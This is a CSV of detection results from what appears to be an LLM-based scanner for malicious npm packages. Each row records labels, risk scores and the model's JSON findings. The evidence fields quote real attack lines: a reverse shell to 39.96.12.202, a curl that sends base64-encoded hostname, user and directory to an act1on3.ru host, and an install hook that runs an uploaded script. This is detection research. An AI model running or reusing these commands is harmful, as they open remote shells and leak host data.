package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json,analyst_note
1ru-cache,0.0.1,malicious,2026-03-26T21:51:40.111638,flag,1.0,True,2,backdoor_installation;hardcoded_external_IP,0.96,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""backdoor_installation"",
      ""summary"": ""The package.json file contains a post-install script that installs a backdoor."",
      ""details"": ""The post-install script in the package.json file contains a reverse shell command that connects to an external IP address (34.121.250.204)."",
      ""confidence"": 0.96,
      ""evidence_apis"": [],
      ""evidence_files"": [""package.json""],
      ""evidence_domains"": [],
      ""evidence_commands"": [""bash-c""],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""hardcoded_external_IP"",
      ""summary"": ""The package.json file contains a hardcoded external IP address."",
      ""details"": ""The post-install script in the package.json file contains the hardcoded external IP address '34.121.250.204'."",
      ""confidence"": 0.96,
      ""evidence_apis"": [],
      ""evidence_files"": [""package.json""],
      ""evidence_domains"": [""34.121.250.204""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""backdoor_installation"", ""hardcoded_external_IP""]
}
```","{""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""The package.json file contains a post-install script that installs a backdoor."", ""details"": ""The post-install script in the package.json file contains a reverse shell command that connects to an external IP address (34.121.250.204)."", ""confidence"": 0.96, ""evidence_apis"": [], ""evidence_files"": [""package.json""], ""evidence_domains"": [], ""evidence_commands"": [""bash-c""], ""evidence_env_vars"": []}, {""category"": ""hardcoded_external_IP"", ""summary"": ""The package.json file contains a hardcoded external IP address."", ""details"": ""The post-install script in the package.json file contains the hardcoded external IP address '34.121.250.204'."", ""confidence"": 0.96, ""evidence_apis"": [], ""evidence_files"": [""package.json""], ""evidence_domains"": [""34.121.250.204""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""backdoor_installation"", ""hardcoded_external_IP""]}",
@aaakca/myf,1.0.14,malicious,2026-03-26T21:51:51.379453,review,0.336,True,2,install_hook;suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""install_hook"",
      ""summary"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata."",
      ""details"": ""The install hook commands are: pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt"",
      ""confidence"": 0.72,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [""pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt""],
      ""evidence_env_vars"": []
    },
    {
      ""category"": ""suspicious_behavior"",
      ""summary"": ""Package contains no JavaScript files."",
      ""details"": ""The package file structure does not contain any JavaScript files."",
      ""confidence"": 0.34,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""install_hook"", ""suspicious_behavior""]
}
```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata."", ""details"": ""The install hook commands are: pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt"", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt""], ""evidence_env_vars"": []}, {""category"": ""suspicious_behavior"", ""summary"": ""Package contains no JavaScript files."", ""details"": ""The package file structure does not contain any JavaScript files."", ""confidence"": 0.34, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook"", ""suspicious_behavior""]}",
@alfalab/core-components,37.3.0-beta.10,malicious,2026-03-26T21:51:52.698987,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
@arkadium/eagle-user-client,9.1.1,malicious,2026-03-26T21:52:03.270043,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code is making network requests to a specific host."",
      ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."",
      ""confidence"": 0.78,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [""./.pbk.js""],
      ""evidence_domains"": [""dc.70.lc""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This analysis indicates that the code is making network requests to a specific host, potentially for data exfiltration. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior comes from the use of the 'https.request' API in the file './.pbk.js'. The domain 'dc.70.lc' is also a sign of potential network exfiltration.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a specific host."", ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."", ""confidence"": 0.78, ""evidence_apis"": [""https.request""], ""evidence_files"": [""./.pbk.js""], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the code is making network requests to a specific host, potentially for data exfiltration. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior comes from the use of the 'https.request' API in the file './.pbk.js'. The domain 'dc.70.lc' is also a sign of potential network exfiltration."
@arkadium/eagle-user-client,9.99.999,malicious,2026-03-26T21:52:12.905867,review,0.494,True,1,network_exfiltration,0.71,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443."",
      ""details"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path of the current process."",
      ""confidence"": 0.71,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [""dc.70.lc""],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

This analysis indicates that the code is making network requests to a remote host, potentially for data exfiltration. The risk score is 0.71, indicating a high level of confidence that this behavior is malicious. The evidence for this behavior comes from the network request to 'dc.70.lc' on port 443.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443."", ""details"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path of the current process."", ""confidence"": 0.71, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the code is making network requests to a remote host, potentially for data exfiltration. The risk score is 0.71, indicating a high level of confidence that this behavior is malicious. The evidence for this behavior comes from the network request to 'dc.70.lc' on port 443."
@aszxc/npmexp,1.0.1,malicious,2026-03-26T21:52:20.650050,flag,1.0,True,1,backdoor_installation,0.9,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""backdoor_installation"",
      ""summary"": ""The package contains a backdoor installation signal in the pre-install hook."",
      ""details"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."",
      ""confidence"": 0.9,
      ""evidence_commands"": [""bash-c'bash-i>&/dev/tcp/39.96.12.202/222220>&1'""],
      ""evidence_files"": [],
      ""evidence_apis"": [],
      ""evidence_domains"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""backdoor_installation""]
}
```

```","{""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""The package contains a backdoor installation signal in the pre-install hook."", ""details"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."", ""confidence"": 0.9, ""evidence_commands"": [""bash-c'bash-i>&/dev/tcp/39.96.12.202/222220>&1'""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""backdoor_installation""]}",
@att-bit/duc.components.cardshell,10.0.1,malicious,2026-03-26T21:52:28.453270,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-26T21:52:35.080289,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""network_exfiltration"",
      ""summary"": ""The code sends network requests to a hostname derived from the process arguments and the hostname of the machine."",
      ""details"": ""The code sends a POST request to a hostname derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."",
      ""confidence"": 0.78,
      ""evidence_apis"": [""https.request""],
      ""evidence_files"": [""test.js""],
      ""evidence_domains"": [],
      ""evidence_commands"": [],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""network_exfiltration""]
}
```

```","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code sends network requests to a hostname derived from the process arguments and the hostname of the machine."", ""details"": ""The code sends a POST request to a hostname derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."", ""confidence"": 0.78, ""evidence_apis"": [""https.request""], ""evidence_files"": [""test.js""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}",
@b2bgeo/yav,13.3.8,malicious,2026-03-26T21:52:47.689461,review,0.336,True,1,suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [
    {
      ""category"": ""suspicious_behavior"",
      ""summary"": ""The package contains no JavaScript files and an install hook present."",
      ""details"": ""The package file structure indicates the presence of an install hook that may execute at install time. The commands listed in the package metadata indicate a potential payload that may be remote."",
      ""confidence"": 0.72,
      ""evidence_apis"": [],
      ""evidence_files"": [],
      ""evidence_domains"": [],
      ""evidence_commands"": [""curl-H\""Package:@b2bgeo/yav\""-H\""Version:13.3.8\""-H\""Hostname:$(hostname|base64)\"""", ""-H\""Whoami:$(whoami|base64)\"""", ""-H\""Pwd:$(pwd|base64)\"""", ""-d\""meow!securitytest\""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""],
      ""evidence_env_vars"": []
    }
  ],
  ""risk_vector"": [""suspicious_behavior""]
}
```

This JSON object represents the analysis of the package @b2bgeo/yav version 13.3.8. The behavior category is ""suspicious_behavior"", with a summary and details about the behavior. The confidence level of the behavior is 0.72. The evidence commands indicate a potential payload that may be remote. The risk vector includes the ""suspicious_behavior"" category.","{""behaviors"": [{""category"": ""suspicious_behavior"", ""summary"": ""The package contains no JavaScript files and an install hook present."", ""details"": ""The package file structure indicates the presence of an install hook that may execute at install time. The commands listed in the package metadata indicate a potential payload that may be remote."", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl-H\""Package:@b2bgeo/yav\""-H\""Version:13.3.8\""-H\""Hostname:$(hostname|base64)\"""", ""-H\""Whoami:$(whoami|base64)\"""", ""-H\""Pwd:$(pwd|base64)\"""", ""-d\""meow!securitytest\""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_env_vars"": []}], ""risk_vector"": [""suspicious_behavior""]}","This JSON object represents the analysis of the package @b2bgeo/yav version 13.3.8. The behavior category is ""suspicious_behavior"", with a summary and details about the behavior. The confidence level of the behavior is 0.72. The evidence commands indicate a potential payload that may be remote. The risk vector includes the ""suspicious_behavior"" category."
@dbk-legacy/muster,9.9.91,malicious,2026-03-26T21:52:49.055176,skip,0.0,True,0,none,,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
{
  ""behaviors"": [],
  ""risk_vector"": []
}
```

```","{""behaviors"": [], ""risk_vector"": []}",
